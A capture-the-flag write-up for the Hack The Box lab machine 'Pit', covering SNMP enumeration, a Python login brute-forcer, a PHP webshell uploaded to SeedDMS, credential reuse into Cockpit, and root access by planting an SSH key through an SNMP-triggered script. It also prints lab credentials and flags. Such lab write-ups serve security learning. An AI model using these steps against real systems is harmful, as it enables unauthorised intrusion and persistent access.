# Pit

export IP=10.10.10.241

# Solution

Start with the al'mighty nmap

```bash
cmd: nmap -sC -sV -oN nmap/initial $IP

22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
80/tcp   open  http            nginx 1.14.1
|_http-server-header: nginx/1.14.1
|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
9090/tcp open  ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2020-04-16T23:29:12
|_Not valid after:  2030-06-04T16:09:12
|_ssl-date: TLS randomness does not represent time
```

We can see right away two possible hosts from the SSL cert: **dms-pit.htb** and **pit.htb** <br>

Accessing both of those (after adding to the **/etc/hosts** file) we have some interesting behaviour:
- dms-pit.htb -> Unauthorized
- pit.htb     -> nginx default page

Also went ahead and checked that **9090** and we got a login form <br>

Tried a bunch of stuff (sqli, broken auth, etc) but without any success ! Also found CVE for a prior version but it did not work because it needed a user and i dont have it <br>

After being stuck for a bunch i realized i never mess with udp and might be something there (too odd not having a single point of suspiscion towards some part of the box) <br>

And well, it paid off tho !

```bash
cmd: sudo nmap -sU $IP
161/udp   open|filtered snmp
```

Never messed with those ! First pitstop, [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp) :D <br>

First thing (after reading a bit about how the objects are organized by the snmp), we need to find a communit key (with brute-forcing). For this i used the tool **onesixtyone** 

```bash
cmd: onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 10.10.10.241
Scanning 1 hosts, 51 communities
10.10.10.241 [public] Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64
```

We got a community key (**public**) boyzzzzzzz ! <br>

Next step (from the hacktricks still), lets walk the snmp OID's
```bash
cmd: snmpwalk -v 2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendOutputFull

NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Memory usage
            total        used        free      shared  buff/cache   available
Mem:          3.8Gi       484Mi       2.7Gi       8.0Mi       722Mi       3.1Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *            <----- USERNAMES
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
07:52:13 up  7:33,  1 user,  load average: 0.00, 0.00, 0.01
```

Now, i went a ran the other commands (from hacktricks) which disclosed the OID's structure (not all of it, but most of it, more on this later)
```bash
cmd: snmpwalk -v 2c -c public 10.10.10.241

iso.3.6.1.2.1.1.1.0 = STRING: "Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 #1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2729888) 7:34:58.88
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmp.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "pit.htb"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown (edit /etc/snmp/snmpd.conf)"
# -- snip --
``` 

Also, found a [resource](https://net-snmp.sourceforge.io/wiki/index.php/TUT:snmpwalk) that stated that to get the complete structure we need to specify the starting OID to retrieve more than one group of information
```bash
cmd: snmpwalk -v 2c -c public 10.10.10.241 .iso
# -- snip --
iso.3.6.1.4.1.2021.9.1.2.2 = STRING: "/var/www/html/seeddms51x/seeddms"  <- Hummmmm
# -- snip --
```

And sure we did !!! (just shown the important part because the output is MASSIVE) <br>

**Note:** As stated in the hacktricks page, i ran **snmp-check** and **braa** but the data retrieved was essentially the same <br>

Soooo, what is **seeddms**: SeedDMS is a free document management system with an easy to use web based user interface <br>

It is a web application and is running where it should (**/var/www/html**), is it accessible through the pages we found early? <br>
- **pit.htb** (pit.htb/seeddms51x/seeddms) cannot access it
- **dms-pit.htb** (dms-pit.htb/seeddms51x/seeddms) can access it (login form)

We have the users from the snmpwalk, lets Brute-force it !! (also tested for sqli, no success) <br>

I tried to use burp intruder, but it becomes so slow in the community edition that i made a dirty python script (even though it is not threaded, it is faster than burp's intruder) 
```python
import requests
import time
url = 'http://dms-pit.htb/seeddms51x/seeddms/op/op.Login.php'
INVALID = "Error signing in."
usernames = open("users.txt", "r")   # <----- found in the snmpwalk afore
passwords = open("passwd.txt", "r")  # <----- rockyou.txt 
usernames = usernames.readlines()    # <----- since is the inner loop, need to retrieve all of them first

for passwd in passwords.readlines():
    passwd = passwd.strip()
    for user in usernames:
        user = user.strip()
        print("Testing -> {}:{}".format(user, passwd))
        data = { 'login': user,'pwd' : passwd}
        x = requests.post(url, data = data)
        if INVALID not in x.text:
            print("Found valid creds!!! -> {}:{}".format(user, passwd))            
            exit(0)
close(passwords)
``` 

To fast things up i did an unusual approach:
- ran smallest rockyou.txt
- Found?
  - **Y**: exit
  - **N**: remove curr-rockyou from next-rockyou, repeat

Two iterations of wordlists were enough, saving a bunch of time: ```michelle:michelle``` <br>

Checking the webapp a bit we can see some things right away:
- "Owner: Administrator" -----> mailto:admin@pit.htb (possible user)
- Upgrade note
  - Name: 	Upgrade Note
  - Owner: 	Administrator	
  - Comment: 	Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb.
  - Used disk space: 	99.27 KiB
  - Created: 	2020-04-21 21:55:55
- at Docs/Users/Jack
  - "Owner: Jack" -----> mailto:jack@dms-pit.htb (possible user)
- at Docs/Users/Michelle/
  - Can upload files !!!!!
  - Test upload file with payload: ```<?php phpinfo(); ?>```
  
Now here's a problem, we cannot access the file directly from the UI (it only allows to download). Googling a bit i found [this](https://packetstormsecurity.com/files/153383/SeedDMS-Remote-Command-Execution.html). <br>

So we can access the uploaded files @ **example.com/data/1048576/DOCUMENT_ID/1.php** <br>

Finding the correct folder path was a bit tricky (since the file is removed after a bit):
- Path to view the file entry (via the app): dms-pit.htb/seeddms51x/seeddms/out/out.ViewDocument.php?documentid=31&showtree=1
- Tried Paths to access the file (via url): 
  - dms-pit.htb/data/1048576/31/1.php (404)
  - dms-pit.htb/seeddms51x/seeddms/data/1048576/31/1.php (404)
  - dms-pit.htb/seeddms51x/data/1048576/33/1.php (php info page)

Lets upload a webshell, shall we?! <br>

**Note:** Also tried a reverse shell (php) but it might be blocking cause it is not connecting (nginx can do WAF and we saw filtered for snmp) <br>

Found several things, most of them were nothing important. But, eventually, i found some interesting stuff:
- Found a sqlite3 db @ /var/www/html/seeddms51x/data/lucene - nothing, just holding documents data
- SeedDMS config file @ /var/www/html/seeddms51x/conf/settings.xml - **mysql creds**! 

```xml
-- snip --
<dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu">
-- snip --
``` 

Since we are using a webshell (and not an interactive one), we need to pass queries inline
```bash
cmd: mysql -u "seeddms" -h "localhost" -p"ied^ieY6xoquu" -D "seeddms" -e "show tables;" 
# EMPTY
```

Hummmm, strange! Lets check for creds reuse
```bash
# Users
michelle
root
__default__
admin
jack

# Passwords
ied^ieY6xoquu
michelle

# Tests
ssh - only with keys
SpeedDMS (dms-pit.htb/seeddms51x/seeddms/) - no luck # tested for: admin, jack and root
Cockpit (pit.htb:9090/) - WORKS # michelle:ied^ieY6xoquu
```
From the UI, we have a fully featured terminal but cant paste, so i did a reverse shell (even though it was worse because it was a junkie shell) <br>

```bash 
cmd: whoami && id

michelle
uid=1000(michelle) gid=1000(michelle) groups=1000(michelle) context=user_u:user_r:user_t:s0

cmd: cat user.txt
# FLAG: 8941627dc27f79867ad7391e875da8c7
```

Running linpeas, we got some interesting stuff
```bash
/usr/sbin/grub2-set-bootflag (Unknown SUID binary)

Files with ACLs (limited to 50)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
# file: /usr/local/monitoring
USER   root      rwx     
user   michelle  -wx     
GROUP  root      rwx     
mask             rwx     
other            ---   

-rw-r--r--. 1 root root 3019 May 15  2020 /etc/bashrc
-rw-r--r--. 1 root root 376 Jul 21  2020 /etc/skel/.bashrc  
``` 

Hum, interesting, never encountered **ACL's** but they basically set permissions and extend the linux permissions system <br>

Now, i remember seeing some processes stuff in the **snmpwalk** dump, lets see if anything there regarding this monitor thing 

```bash
cmd (local): cat snmp_dump_from_root | grep monitor

iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"

cmd (remote: michelle): file /usr/bin/monitor
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable

cmd (remote: michelle): cat /usr/bin/monitor
#!/bin/bash

for script in /usr/local/monitoring/check*sh
do
    /bin/bash $script
done
```

From the ACL we know we can write to that folder (**/usr/local/monitoring**)! (but cannot read tho, similar to the tentacle privesc where we needed to add a krbconf to a certain folder to make it propagate to the user's home folder) <br>

What i did was:
- Create a test script (to just ping my local machine)
- Set the ACL's for it (not really needed but well, i did)
  - ```setfacl -m u:michelle:rwx check_www.sh```
- Copy to the **/usr/local/monitoring/** with a name that matches that regex
  - ```cp check_www.sh /usr/local/monitoring/check_www.sh```

Since i knew (and know) very little about **snmp** i just waited a few minutes to see if it had some sort of trigger over that script, but it doesn't. <br>

I struggled a bunch here and lost big time searching but eventually found some interesting stuff
- This [post](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/), which uses **NET-SNMP-EXTEND-MIB::nsExtendObjects** to extend the objects and execute them (those who are executable)
- Walk on the very first OID (.iso) does the same (takes more time tho)
- Walk at the OID branch start does the same as afore
  - iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1 -> start new branch
  - iso.3.6.1.4.1.8072.1.3.2.2.1.2.10.109.111.110.105.116.111.114.105.110.103 = STRING: "/usr/bin/monitor"
  - (...)
  - iso.3.6.1.4.1.8072.1.3.2.2.1 -> walk here, it executes

Now that we know that it is executing, the really annoying stuff arrives. I tried a script to:
- create a file (with touch and output redirection)
- change a file (with move)
- duplicate a file (with cp)
- create a symlink to bash and chmod +s it (could chmod directly but, well, i didn't)
- ping local machine (again)

None of those worked. But **SSH** DID!!! <br>

I just created a script to add a **public key** to root's **authorized_keys**, with the following
```bash
cmd: echo '#!/bin/bash' > check_www.sh
cmd: echo -n 'echo "<ssh_pub_key_here>" >> /root/.ssh/authorized_keys' >> check_www.sh
cmd: cp check_www.sh /usr/local/monitoring/check_www.sh
``` 

Then issue this command while the script still "alive" (HTB clean them fast): ```snmpwalk -v 2c -c public 10.10.10.241 iso.3.6.1.4.1.8072.1.3.2.2.1```

And ssh to it! 
```bash
cmd: whoami && id
root
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
cmd: cat root.txt
# FLAG: d7721aa52dad2ca73fc64cf519e12c30
```